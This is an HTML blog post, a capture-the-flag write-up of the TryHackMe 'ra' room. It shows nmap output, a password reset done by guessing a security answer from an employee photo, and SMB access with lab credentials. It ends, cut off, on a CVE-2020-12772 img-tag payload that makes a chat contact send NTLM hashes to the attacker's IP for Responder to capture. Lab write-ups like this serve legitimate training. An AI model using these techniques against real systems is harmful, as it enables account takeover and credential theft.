@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="as i&amp;rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&amp;rsquo;ve had to take time away from it to keep practicing all that i&amp;rsquo;ve learned so far. &amp;ldquo;ra&amp;rdquo; happened to be the most challenging room i&amp;rsquo;ve done until now, but i&amp;rsquo;m sure there are more to come, that take even more skills into account." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/posts/2021/11/tryhackme-ra/" />
+
+
+    <title>
+        
+            tryhackme: ra ::  
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="tryhackme: ra">
+<meta itemprop="description" content="as i&rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&rsquo;ve had to take time away from it to keep practicing all that i&rsquo;ve learned so far. &ldquo;ra&rdquo; happened to be the most challenging room i&rsquo;ve done until now, but i&rsquo;m sure there are more to come, that take even more skills into account."><meta itemprop="datePublished" content="2021-11-10T16:37:38-05:00" />
+<meta itemprop="dateModified" content="2021-11-10T16:37:38-05:00" />
+<meta itemprop="wordCount" content="3028"><meta itemprop="image" content=""/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="tryhackme: ra"/>
+<meta name="twitter:description" content="as i&rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&rsquo;ve had to take time away from it to keep practicing all that i&rsquo;ve learned so far. &ldquo;ra&rdquo; happened to be the most challenging room i&rsquo;ve done until now, but i&rsquo;m sure there are more to come, that take even more skills into account."/>
+
+
+
+    <meta property="og:title" content="tryhackme: ra" />
+<meta property="og:description" content="as i&rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&rsquo;ve had to take time away from it to keep practicing all that i&rsquo;ve learned so far. &ldquo;ra&rdquo; happened to be the most challenging room i&rsquo;ve done until now, but i&rsquo;m sure there are more to come, that take even more skills into account." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/2021/11/tryhackme-ra/" /><meta property="og:image" content=""/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-10T16:37:38-05:00" />
+<meta property="article:modified_time" content="2021-11-10T16:37:38-05:00" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-11-10 16:37:38 -0500 EST" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                # cd /home/</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#fa8072;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">about</a></li><li><a href="/cv/">cv</a></li><li><a href="/posts/">posts</a></li><li><a href="/photography/">photography</a></li>
+    </ul>
+</nav>
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        15 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="/posts/2021/11/tryhackme-ra/">tryhackme: ra</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p>as i&rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&rsquo;ve had to take time away from it to keep practicing all that i&rsquo;ve learned so far. &ldquo;ra&rdquo; happened to be the most challenging room i&rsquo;ve done until now, but i&rsquo;m sure there are more to come, that take even more skills into account.</p>
+<p>the story with the room is that there&rsquo;s a mega corporation called WindCorp, and they like to brag about the fact that they&rsquo;re &ldquo;unhackable&rdquo;. in this story, we&rsquo;re a hacker trying to make them eat their words, and we&rsquo;ll be exploiting a windows machine that we&rsquo;ve spotted.</p>
+<p>as usual, we get a target IP address: 10.10.75.59</p>
+<p>and again, we&rsquo;ll start off with an nmap scan (and save the results):</p>
+<pre tabindex="0"><code>nmap -sC -sV -Pn -oN openports.txt 10.10.75.79
+# Nmap 7.91 scan initiated Wed Oct 27 14:05:11 2021 as: nmap -sC -sV -Pn -oN openports.txt 10.10.75.59
+Nmap scan report for windcorp.thm (10.10.75.59)
+Host is up (0.15s latency).
+Not shown: 978 filtered ports
+PORT     STATE SERVICE             VERSION
+53/tcp   open  domain              Simple DNS Plus
+80/tcp   open  http                Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Windcorp.
+88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2021-10-27 18:06:06Z)
+135/tcp  open  msrpc               Microsoft Windows RPC
+139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
+389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|   Negotiate
+|_  NTLM
+| http-ntlm-info: 
+|   Target_Name: WINDCORP
+|   NetBIOS_Domain_Name: WINDCORP
+|   NetBIOS_Computer_Name: FIRE
+|   DNS_Domain_Name: windcorp.thm
+|   DNS_Computer_Name: Fire.windcorp.thm
+|   DNS_Tree_Name: windcorp.thm
+|_  Product_Version: 10.0.17763
+|_http-title: Site doesn&#39;t have a title.
+| ssl-cert: Subject: commonName=Windows Admin Center
+| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
+| Not valid before: 2020-04-30T14:41:03
+|_Not valid after:  2020-06-30T14:41:02
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+2179/tcp open  vmrdp?
+3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+3389/tcp open  ms-wbt-server       Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WINDCORP
+|   NetBIOS_Domain_Name: WINDCORP
+|   NetBIOS_Computer_Name: FIRE
+|   DNS_Domain_Name: windcorp.thm
+|   DNS_Computer_Name: Fire.windcorp.thm
+|   DNS_Tree_Name: windcorp.thm
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-10-27T18:06:51+00:00
+| ssl-cert: Subject: commonName=Fire.windcorp.thm
+| Not valid before: 2021-10-26T17:59:00
+|_Not valid after:  2022-04-27T17:59:00
+5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     stream_id: 6w7aj2dxwk
+|     unknown: 
+| 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|     capabilities: 
+| 
+|     auth_mechanisms: 
+| 
+|     compression_methods: 
+| 
+|     xmpp: 
+|       version: 1.0
+|_    features: 
+5269/tcp open  xmpp                Wildfire XMPP Client
+| xmpp-info: 
+|   Respects server name
+|   STARTTLS Failed
+|   info: 
+|     stream_id: 79ay7u58wh
+|     unknown: 
+| 
+|     errors: 
+|       host-unknown
+|       (timeout)
+|     capabilities: 
+| 
+|     auth_mechanisms: 
+| 
+|     compression_methods: 
+| 
+|     xmpp: 
+|       version: 1.0
+|_    features: 
+7070/tcp open  http                Jetty 9.4.18.v20190429
+|_http-title: Openfire HTTP Binding Service
+7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
+|_http-title: Openfire HTTP Binding Service
+| ssl-cert: Subject: commonName=fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+7777/tcp open  socks5              (No authentication; connection failed)
+| socks-auth-info: 
+|_  No authentication
+9090/tcp open  zeus-admin?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 27 Oct 2021 18:06:06 GMT
+|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 115
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;
+|     &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;URL=index.jsp&#34;&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 27 Oct 2021 18:06:14 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   JavaRMI, drda, ibm-db2-das, informix: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+|   SqueezeCenter_CLI: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   WMSRequest: 
+|     HTTP/1.1 400 Illegal character CNTL=0x1
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x1&lt;/pre&gt;
+9091/tcp open  ssl/xmltec-xmlmail?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 27 Oct 2021 18:06:32 GMT
+|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 115
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;
+|     &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;URL=index.jsp&#34;&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 27 Oct 2021 18:06:33 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   Help: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
+|   RTSPRequest: 
+|     HTTP/1.1 400 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   SSLSessionReq: 
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
+| ssl-cert: Subject: commonName=fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9090-TCP:V=7.91%I=7%D=10/27%Time=6179950F%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,11D,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x20
+SF:2021\x2018:06:06\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\
+SF:x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
+SF:ytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;&lt;/title&gt;\n&lt;m
+SF:eta\x20http-equiv=\&#34;refresh\&#34;\x20content=\&#34;0;URL=index\.jsp\&#34;&gt;\n&lt;/head&gt;
+SF:\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&#34;)%r(JavaRMI,C3,&#34;HTTP/1\.1\x20400\x20Ille
+SF:gal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-
+SF:8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\
+SF:x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x0&lt;
+SF:/pre&gt;&#34;)%r(WMSRequest,C3,&#34;HTTP/1\.1\x20400\x20Illegal\x20character\x20CN
+SF:TL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
+SF:th:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;
+SF:&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x1&lt;/pre&gt;&#34;)%r(ibm-db2-das,
+SF:C3,&#34;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ
+SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti
+SF:on:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illeg
+SF:al\x20character\x20CNTL=0x0&lt;/pre&gt;&#34;)%r(SqueezeCenter_CLI,9B,&#34;HTTP/1\.1\x
+SF:20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
+SF:Content-Length:\x2049\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message
+SF:\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x20URI&lt;/pre&gt;&#34;)%r(informix,C3,&#34;HTTP/1\.1\
+SF:x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/htm
+SF:l;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r
+SF:\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20characte
+SF:r\x20CNTL=0x0&lt;/pre&gt;&#34;)%r(drda,C3,&#34;HTTP/1\.1\x20400\x20Illegal\x20charact
+SF:er\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
+SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20
+SF:400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x0&lt;/pre&gt;&#34;)%r(HTTP
+SF:Options,56,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x20202
+SF:1\x2018:06:14\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port9091-TCP:V=7.91%T=SSL%I=7%D=10/27%Time=61799529%P=x86_64-pc-linux-g
+SF:nu%r(GetRequest,11D,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20O
+SF:ct\x202021\x2018:06:32\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2
+SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges
+SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;&lt;/titl
+SF:e&gt;\n&lt;meta\x20http-equiv=\&#34;refresh\&#34;\x20content=\&#34;0;URL=index\.jsp\&#34;&gt;\n&lt;
+SF:/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&#34;)%r(HTTPOptions,56,&#34;HTTP/1\.1\x202
+SF:00\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x202021\x2018:06:33\x20GMT\r\nAl
+SF:low:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&#34;)%r(RTSPRequest,AD,&#34;HTTP/1\.1\x20
+SF:400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-885
+SF:9-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20
+SF:Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;/pre&gt;&#34;)%r(RPCChec
+SF:k,C7,&#34;HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent
+SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConn
+SF:ection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20I
+SF:llegal\x20character\x20OTEXT=0x80&lt;/pre&gt;&#34;)%r(DNSVersionBindReqTCP,C3,&#34;HT
+SF:TP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20
+SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x2
+SF:0close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20
+SF:character\x20CNTL=0x0&lt;/pre&gt;&#34;)%r(DNSStatusRequestTCP,C3,&#34;HTTP/1\.1\x2040
+SF:0\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;cha
+SF:rset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\
+SF:n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20
+SF:CNTL=0x0&lt;/pre&gt;&#34;)%r(Help,9B,&#34;HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Ty
+SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnect
+SF:ion:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x
+SF:20URI&lt;/pre&gt;&#34;)%r(SSLSessionReq,C5,&#34;HTTP/1\.1\x20400\x20Illegal\x20charac
+SF:ter\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
+SF:ntent-Length:\x2070\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x
+SF:20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x16&lt;/pre&gt;&#34;);
+Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-10-27T18:06:52
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Oct 27 14:09:16 2021 -- 1 IP address (1 host up) scanned in 245.53 seconds
+</code></pre><p>well. that&rsquo;s big.</p>
+<p>i&rsquo;ll trim the fat:</p>
+<pre tabindex="0"><code>53/tcp   open  domain              Simple DNS Plus
+80/tcp   open  http                Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2021-10-27 18:06:06Z)
+135/tcp  open  msrpc               Microsoft Windows RPC
+139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
+389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+2179/tcp open  vmrdp?
+3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+3389/tcp open  ms-wbt-server       Microsoft Terminal Services
+5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+5269/tcp open  xmpp                Wildfire XMPP Client
+7070/tcp open  http                Jetty 9.4.18.v20190429
+7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
+7777/tcp open  socks5              (No authentication; connection failed)
+9090/tcp open  zeus-admin?
+9091/tcp open  ssl/xmltec-xmlmail?
+</code></pre><p>we can see a bunch of services running across a variety of ports. the key here is to not be overwhelmed, and start small. some (or a lot) of these services could even just be rabbit holes waiting to be traversed.</p>
+<p>i modified the /etc/hosts file and added windcorp.thm (DNS domain name) and fire.windcorp.thm (DNS computer name).</p>
+<p>let&rsquo;s visit <a href="http://windcorp.thm">http://windcorp.thm</a>.</p>
+<p>the search bar on the site doesn&rsquo;t work, but the &ldquo;reset password&rdquo; link does.</p>
+<p><img src="/resetpassword.png" alt="reset"></p>
+<p>i have no idea how to fill in these fields, so i&rsquo;m going to continue digging around the site.</p>
+<p>scrolling down a bit, and we can see a list of employees:</p>
+<pre tabindex="0"><code>Antonietta Vidal
+Britney Palmer
+Brittany Cruz
+Carla Meyer
+Buse Candan
+Edeltraut Daub
+Edward Lewis
+Emile Lavoie
+Emile Henry
+Emily Anderson
+Hemmo Boschma
+Isabella Hughes
+Isra Saur
+Jackson Vasquez
+Jaqueline Dittmer
+Emily Jensen
+Lily Levesque
+Kirk Uglas
+</code></pre><p>let&rsquo;s save these names to a file (users.txt), then break up the names so we can search the site&rsquo;s source to see if they pop in any form anywhere else.</p>
+<pre tabindex="0"><code>cat users.txt | tr -s &#39; &#39; &#39;\n&#39; &gt; userslist.txt
+</code></pre><p>the output (userslist.txt) now looks like:</p>
+<pre tabindex="0"><code>Antonietta
+Vidal
+Britney
+Palmer
+Brittany
+Cruz
+Carla
+Meyer
+Buse
+Candan
+Edeltraut
+Daub
+Edward
+Lewis
+Emile
+Lavoie
+Emile
+Henry
+Emily
+Anderson
+Hemmo
+Boschma
+Isabella
+Hughes
+Isra
+Saur
+Jackson
+Vasquez
+Jaqueline
+Dittmer
+Emily
+Jensen
+Lily
+Levesque
+Kirk
+Uglas
+</code></pre><p>now let&rsquo;s feed this list to a <code>curl</code> command:</p>
+<pre tabindex="0"><code>curl http://windcorp.thm | egrep -i -f userslist.txt
+</code></pre><p><img src="/curlingusers.png" alt="curlingusers"></p>
+<p>we can see the names pop up in some email addresses, but towards the end we can see the names pop up in what appear to be some images. the image that caught my eye was <strong>lilyleAndSparky.jpg</strong>.</p>
+<p><img src="/employees.png" alt="employees"></p>
+<p><img src="/employees2.png" alt="employees2"></p>
+<p>could this be the key to resetting the password? we have a username: lilyle (lily levesque) and the name &ldquo;sparky&rdquo; (probably her dog&rsquo;s name). one of the security questions was &ldquo;what is/was your favorite pets name?&rdquo;. let&rsquo;s try it.</p>
+<p><img src="/lilylepassword.png" alt="lilylepassword"></p>
+<p>wow, it actually worked. which is good, because if it didn&rsquo;t i would really not know what to do next and would have to rethink my whole attack.</p>
+<p>armed with these credentials (lilyle:ChangeMe#1234), let&rsquo;s enumerate the SMB shares and try to log into one of them.</p>
+<pre tabindex="0"><code>smbclient -L 10.10.75.59 -U lilyle
+</code></pre><p>enter the password when prompted.</p>
+<p>we can also use:</p>
+<pre tabindex="0"><code>smbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm
+</code></pre><p><img src="/smbenumeration.png" alt="smbenumeration"></p>
+<p>let&rsquo;s try to login to the &ldquo;Shared&rdquo; share.</p>
+<pre tabindex="0"><code>smbclient \\\\10.10.75.59\\Shared -U lilyle --password ChangeMe#1234
+</code></pre><p><img src="/smblogin+flag1.png" alt="smblogin"></p>
+<p>we can see there&rsquo;s a flag stored right there, along with installers for an application called &ldquo;spark&rdquo;.</p>
+<p>let&rsquo;s download both the flag, and the .deb installer.</p>
+<pre tabindex="0"><code>get &#34;Flag 1.txt&#34;
+get spark_2_8_3.deb
+</code></pre><p>if the installer is too big for your network connection, the connection will timeout. in that case, you can try <code>curl</code>:</p>
+<pre tabindex="0"><code>curl -u &#34;windcorp.thm\lilyle:ChangeMe#1234&#34; smb://windcorp.thm/Shared/spark_2_8_3.deb
+</code></pre><p>this didn&rsquo;t work for me either, so i tried to download and install the tarball package (spark_2_8_3.tar.gz). when that also didn&rsquo;t work, i ended up finding an installer on the internet and just downloaded then installed that. the version difference in this case didn&rsquo;t matter, but in a real-life scenario, versions are often very important, and some exploits don&rsquo;t work with later versions of applications.</p>
+<p>once you&rsquo;ve downloaded spark, try to get some info on the package.</p>
+<pre tabindex="0"><code>dpkg-deb -I spark_2_8_3.deb
+</code></pre><p><img src="/sparkinfo.png" alt="sparkinfo"></p>
+<p>it&rsquo;s a &ldquo;cross-platform real-time collaboration client optimized for business and organizations&rdquo;.</p>
+<p>basically, it&rsquo;s an IM client or chat app.</p>
+<p>when it&rsquo;s installed, try to use the credentials lilyle:ChangeMe#1234 to log in.</p>
+<p>the login fails, because the app wasn&rsquo;t able to verify the certificate. no matter, because we can go into the advanced settings of the app and select the option &ldquo;accept all certificates&rdquo; and disable &ldquo;certificate hostname verification&rdquo;.</p>
+<p>now, we can log in.</p>
+<p>we see there&rsquo;s a conference room, but no one is in it. the app looks pretty empty.</p>
+<p><img src="/spark_room.png" alt="spark_room"></p>
+<p><img src="/sparkempty.png" alt="sparkempty"></p>
+<p>when dealing with apps like this, it&rsquo;s good practice to start searching vuln databases to see if any exploit exists. a good place to check is <a href="https://attackerkb.com/">https://attackerkb.com/</a></p>
+<p>searching for &ldquo;spark exploits&rdquo; leads us to CVE-2020-12772.</p>
+<p><img src="/attackerkb.png" alt="attackerkb"></p>
+<p>in a nutshell, this exploit allows us to send an &ldquo;image&rdquo; to a contact, but the SRC attribute of the image will refer our IP address. when the contact clicks this link, their hashes will be sent with the HTTP request. to receive this data, we&rsquo;ll need to run Responder.py.</p>
+<p>now we need to select a target. if you remember, the site had a list of technical staff and their status (online/offline). going back to the site, we see that the user &ldquo;buse&rdquo; is online. let&rsquo;s target them.</p>
+<p>first, run responder:</p>
+<pre tabindex="0"><code>/opt/Responder/Responder.py
+</code></pre><p>now, send the following &ldquo;image&rdquo; to buse:</p>
+<pre tabindex="0"><code>&lt;img src=&#34;http://10.9.6.194/bilal.jpg&gt;
